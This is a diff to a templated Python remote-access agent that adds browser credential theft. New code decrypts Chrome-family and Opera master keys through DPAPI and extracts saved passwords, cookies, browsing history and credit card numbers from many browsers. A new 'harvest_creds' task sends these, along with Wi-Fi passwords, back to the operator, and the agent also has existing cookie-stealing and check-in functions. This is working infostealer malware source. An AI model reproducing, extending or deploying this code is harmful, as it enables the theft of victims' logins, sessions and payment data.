@@ -95,8 +95,12 @@ except ImportError as e:
     
 
 
+    
+
+
 # ======================
 # Configuration
+# Importaint! The config class needs to have single curly braces. Everything else should have double, to escape the jinja rendering.
 # ======================
 class Config:
     def __init__(self):
@@ -148,7 +152,7 @@ class CredentialHarvester:
             profiles = []
             results = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8', errors='ignore').split('\n')
             profiles = [line.split(":")[1].strip() for line in results if "All User Profile" in line]
-            
+
             wifi_passwords = []
             for profile in profiles:
                 try:
@@ -162,10 +166,267 @@ class CredentialHarvester:
                     }})
                 except:
                     continue
-            
+
             return wifi_passwords
         except:
             return []
+
+    @staticmethod
+    def get_browser_credentials():
+        """Extract browser passwords and history using browserextractor logic"""
+        try:
+            # Import and use the Browsers class from browserextractor
+            # Browsers class code is embedded directly in the agent template
+            # to avoid external module dependencies
+
+            import os
+            import sqlite3
+            import json
+            import base64
+            import shutil
+            import requests
+            from Crypto.Cipher import AES
+            import win32crypt
+            import zipfile
+            import io
+            import time
+            import random
+            import threading
+            from typing import Union
+            from win32crypt import CryptUnprotectData
+
+            class Browsers:
+                def __init__(self):
+                    self.appdata = os.getenv('LOCALAPPDATA')
+                    self.roaming = os.getenv('APPDATA')
+                    self.browsers = {{
+                        'kometa': self.appdata + '\\Kometa\\User Data',
+                        'orbitum': self.appdata + '\\Orbitum\\User Data',
+                        'cent-browser': self.appdata + '\\CentBrowser\\User Data',
+                        '7star': self.appdata + '\\7Star\\7Star\\User Data',
+                        'sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data',
+                        'vivaldi': self.appdata + '\\Vivaldi\\User Data',
+                        'google-chrome-sxs': self.appdata + '\\Google\\Chrome SxS\\User Data',
+                        'google-chrome': self.appdata + '\\Google\\Chrome\\User Data',
+                        'epic-privacy-browser': self.appdata + '\\Epic Privacy Browser\\User Data',
+                        'microsoft-edge': self.appdata + '\\Microsoft\\Edge\\User Data',
+                        'uran': self.appdata + '\\uCozMedia\\Uran\\User Data',
+                        'yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data',
+                        'brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
+                        'iridium': self.appdata + '\\Iridium\\User Data',
+                        'opera': self.roaming + '\\Opera Software\\Opera Stable',
+                        'opera-gx': self.roaming + '\\Opera Software\\Opera GX Stable',
+                        'coc-coc': self.appdata + '\\CocCoc\\Browser\\User Data'
+                    }}
+
+                    self.profiles = [
+                        'Default',
+                        'Profile 1',
+                        'Profile 2',
+                        'Profile 3',
+                        'Profile 4',
+                        'Profile 5',
+                    ]
+
+                    # Initialize data structures to collect results
+                    self.credentials_data = []
+                    self.history_data = []
+                    self.temp_path = os.path.expanduser("~/tmp")
+                    if not os.path.exists(self.temp_path):
+                        os.makedirs(self.temp_path)
+                    print("Starting browser data collection...")
+
+                    def process_browser(name, path, profile, func):
+                        try:
+                            print(f"Processing {{name}} {{profile}} with {{func.__name__}}")
+                            func(name, path, profile)
+                        except Exception as e:
+                            print(f"Error processing {{name}} {{profile}} {{func.__name__}}: {{e}}")
+
+                    threads = []
+                    for name, path in self.browsers.items():
+                        if not os.path.isdir(path):
+                            print(f"Browser path not found: {{path}}")
+                            continue
+
+                        print(f"Processing browser: {{name}} at {{path}}")
+                        self.masterkey = self.get_master_key(path + '\\Local State')
+                        funcs = [
+                            lambda n, p, pr: self.cookies(n, p, pr),
+                            lambda n, p, pr: self.history(n, p, pr),
+                            lambda n, p, pr: self.passwords(n, p, pr),
+                            lambda n, p, pr: self.credit_cards(n, p, pr)
+                        ]
+
+                        for profile in self.profiles:
+                            for func in funcs:
+                                print(f"Starting thread for {{name}} {{profile}} {{func.__name__}}")
+                                thread = threading.Thread(target=process_browser, args=(name, path, profile, func))
+                                thread.start()
+                                threads.append(thread)
+
+                    print(f"Waiting for {{len(threads)}} threads to complete...")
+                    for thread in threads:
+                        thread.join()
+                    print(f"Browser data collection complete. Credentials: {{len(self.credentials_data)}}, History: {{len(self.history_data)}}")
+
+                def get_master_key(self, path: str) -> str:
+                    try:
+                        with open(path, "r", encoding="utf-8") as f:
+                            c = f.read()
+                        local_state = json.loads(c)
+                        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+                        master_key = master_key[5:]
+                        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
+                        return master_key
+                    except Exception:
+                        pass
+
+                def decrypt_password(self, buff: bytes, master_key: bytes) -> str:
+                    iv = buff[3:15]
+                    payload = buff[15:]
+                    cipher = AES.new(master_key, AES.MODE_GCM, iv)
+                    decrypted_pass = cipher.decrypt(payload)
+                    decrypted_pass = decrypted_pass[:-16].decode()
+                    return decrypted_pass
+
+                def passwords(self, name: str, path: str, profile: str):
+                    if name == 'opera' or name == 'opera-gx':
+                        path += '\\Login Data'
+                    else:
+                        path += '\\' + profile + '\\Login Data'
+                    if not os.path.isfile(path):
+                        return
+                    conn = sqlite3.connect(path)
+                    cursor = conn.cursor()
+                    cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
+                    for results in cursor.fetchall():
+                        if not results[0] or not results[1] or not results[2]:
+                            continue
+                        url = results[0]
+                        login = results[1]
+                        password = self.decrypt_password(results[2], self.masterkey)
+                        self.credentials_data.append({{
+                            "browser": name,
+                            "profile": profile,
+                            "url": url,
+                            "username": login,
+                            "password": password
+                        }})
+                    cursor.close()
+                    conn.close()
+
+                def cookies(self, name: str, path: str, profile: str):
+                    if name == 'opera' or name == 'opera-gx':
+                        path += '\\Network\\Cookies'
+                    else:
+                        path += '\\' + profile + '\\Network\\Cookies'
+                    if not os.path.isfile(path):
+                        return
+                    cookievault = self.create_temp()
+                    shutil.copy2(path, cookievault)
+                    conn = sqlite3.connect(cookievault)
+                    cursor = conn.cursor()
+                    with open(os.path.join(self.temp_path, "Browser", "cookies.txt"), 'a', encoding="utf-8") as f:
+                        f.write(f"\nBrowser: {{name}}     Profile: {{profile}}\n\n")
+                        for res in cursor.execute("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies").fetchall():
+                            host_key, name, path, encrypted_value, expires_utc = res
+                            value = self.decrypt_password(encrypted_value, self.masterkey)
+                            if host_key and name and value != "":
+                                f.write(f"{{host_key}}\t{{'FALSE' if expires_utc == 0 else 'TRUE'}}\t{{path}}\t{{'FALSE' if host_key.startswith('.') else 'TRUE'}}\t{{expires_utc}}\t{{name}}\t{{value}}\n")
+                    cursor.close()
+                    conn.close()
+                    os.remove(cookievault)
+
+                def history(self, name: str, path: str, profile: str):
+                    if name == 'opera' or name == 'opera-gx':
+                        path += '\\History'
+                    else:
+                        path += '\\' + profile + '\\History'
+                    if not os.path.isfile(path):
+                        print(f"History file not found: {{path}}")
+                        return
+                    print(f"Processing history for {{name}} profile {{profile}}: {{path}}")
+                    history_vault = self.create_temp()
+                    shutil.copy2(path, history_vault)
+                    conn = sqlite3.connect(history_vault)
+                    cursor = conn.cursor()
+                    results = cursor.execute("SELECT url, visit_count, title, last_visit_time FROM urls").fetchall()
+                    print(f"Found {{len(results)}} history entries for {{name}}")
+                    for res in results:
+                        url, visit_count, title, last_visit_time = res
+                        self.history_data.append({{
+                            "browser": name,
+                            "profile": profile,
+                            "url": url,
+                            "visit_count": visit_count,
+                            "title": title or "",
+                            "last_visit_time": last_visit_time or 0
+                        }})
+                    cursor.close()
+                    conn.close()
+                    os.remove(history_vault)
+                    print(f"History collection complete for {{name}}, total entries: {{len(self.history)}}")
+
+                def credit_cards(self, name: str, path: str, profile: str):
+                    if name in ['opera', 'opera-gx']:
+                        path += '\\Web Data'
+                    else:
+                        path += '\\' + profile + '\\Web Data'
+                    if not os.path.isfile(path):
+                        return
+                    conn = sqlite3.connect(path)
+                    cursor = conn.cursor()
+                    cc_file_path = os.path.join(self.temp_path, "Browser", "cc's.txt")
+                    with open(cc_file_path, 'a', encoding="utf-8") as f:
+                        if os.path.getsize(cc_file_path) == 0:
+                            f.write("Name on Card  |  Expiration Month  |  Expiration Year  |  Card Number  |  Date Modified\n\n")
+                        for res in cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards").fetchall():
+                            name_on_card, expiration_month, expiration_year, card_number_encrypted = res
+                            card_number = self.decrypt_password(card_number_encrypted, self.masterkey)
+                            f.write(f"{{name_on_card}}  |  {{expiration_month}}  |  {{expiration_year}}  |  {{card_number}}\n")
+                    cursor.close()
+                    conn.close()
+
+                def create_zip_and_send(self):
+                    # No longer needed - data is collected directly into self.credentials and self.history
+                    pass
+
+                def create_zip(self, file_paths: list, zip_path: str):
+                    with zipfile.ZipFile(zip_path, 'w') as zipf:
+                        for file in file_paths:
+                            if os.path.isfile(file):
+                                zipf.write(file, os.path.basename(file))
+
+                def create_temp(self, _dir: Union[str, os.PathLike] = None):
+                    if _dir is None:
+                        _dir = os.path.expanduser("~/tmp")
+                    if not os.path.exists(_dir):
+                        os.makedirs(_dir)
+                    file_name = ''.join(random.SystemRandom().choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(random.randint(10, 20)))
+                    path = os.path.join(_dir, file_name)
+                    open(path, "x").close()
+                    return path
+
+            # Create Browsers instance to extract data directly
+            browsers = Browsers()
+
+            # The Browsers class now extracts data directly and returns structured data
+            # No need to parse files - data is returned directly
+
+            return {{
+                "credentials": browsers.credentials_data,
+                "history": browsers.history_data,
+                "wifi": CredentialHarvester.get_wifi_passwords()
+            }}
+
+        except Exception as e:
+            print(f"Error extracting browser data: {{e}}")
+            return {{
+                "credentials": [],
+                "history": [],
+                "wifi": CredentialHarvester.get_wifi_passwords()
+            }}
 
 # ======================
 # Cookie Stealer
@@ -1648,25 +1909,24 @@ class Agent:
         return f"{{platform.node()}}-{{os.getlogin()}}-{{hash(os.getcwd())}}"
 
     def _get_checkin_data(self):
+        try:
+            ip = requests.get('https://api.ipify.org', timeout=5).text
+        except:
+            ip = "unknown"
         data = {{
             "agent_id": self.agent_id,
             "hostname": platform.node(),
             "username": os.getlogin(),
             "os": platform.platform(),
             "privilege": "admin" if (platform.system() == 'Windows' and ctypes.windll.shell32.IsUserAnAdmin()) or (platform.system() != 'Windows' and os.getuid() == 0)  else "user",
-            "ip": requests.get('https://api.ipify.org', timeout=5).text,
+            "ip": ip,
             "timestamp": datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z'),
-            "checkin_interval": self.config.CHECKIN_INTERVAL,  
-            "killdate": self.config.KILLDATE if self.config.KILLDATE_ENABLED else None  
+            "checkin_interval": self.config.CHECKIN_INTERVAL,
+            "killdate": self.config.KILLDATE if self.config.KILLDATE_ENABLED else None
         }}
 
-        if not self._initial_checkin or (time.time() - self._initial_checkin) > 86400:
-            data["credentials"] = {{
-                
-                "wifi": CredentialHarvester.get_wifi_passwords()
-            }}
-            if not self._initial_checkin:
-                self._initial_checkin = time.time()
+        # Remove automatic credential collection from checkin
+        # Credentials will now be collected only when explicitly requested via tasks
         
         if self.config.TAKE_SCREENSHOTS:
             
@@ -2147,13 +2407,13 @@ class Agent:
                     self._log_info("Starting cookie stealing task")
                     stealer = CookieStealer(logger=self.logger, config=self.config)
                     results = stealer.steal_cookies()
-                    
+
                     if not results:
                         return {{
                             "status": "error",
                             "message": "No cookies were stolen"
                         }}
-                    
+
                     return {{
                         "status": "success",
                         "message": f"Stole cookies from {{len(results)}} browsers",
@@ -2161,6 +2421,25 @@ class Agent:
                     }}
                 except Exception as e:
                     self._log_error(f"Cookie stealing failed: {{str(e)}}")
+                    return {{
+                        "status": "error",
+                        "message": str(e)
+                    }}
+
+            elif task_type == "harvest_creds":
+                try:
+                    self._log_info("Starting credential harvesting task")
+                    credentials_data = CredentialHarvester.get_browser_credentials()
+
+                    return {{
+                        "status": "success",
+                        "message": f"Harvested {{len(credentials_data.get('credentials', []))}} credentials, {{len(credentials_data.get('history', []))}} history entries, and {{len(credentials_data.get('wifi', []))}} WiFi passwords",
+                        "credentials": credentials_data.get('credentials', []),
+                        "history": credentials_data.get('history', []),
+                        "wifi": credentials_data.get('wifi', [])
+                    }}
+                except Exception as e:
+                    self._log_error(f"Credential harvesting failed: {{str(e)}}")
                     return {{
                         "status": "error",
                         "message": str(e)
